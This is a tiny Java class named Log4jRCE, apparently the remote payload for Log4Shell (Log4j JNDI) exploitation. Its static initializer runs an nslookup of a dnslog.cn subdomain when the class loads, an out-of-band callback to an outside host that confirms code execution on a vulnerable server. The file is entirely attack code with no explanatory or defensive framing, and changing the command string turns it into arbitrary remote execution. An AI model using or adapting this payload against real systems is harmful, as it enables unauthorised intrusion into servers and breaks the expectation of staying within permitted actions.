import java.io.IOException;

/**
 * @author Cosmos E-mail: liucy@csxbank.com
 * @date 2021/12/10 10:03
 **/
public class Log4jRCE {
    static {
        try {
            Runtime.getRuntime().exec("nslookup fqgrdf.dnslog.cn");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
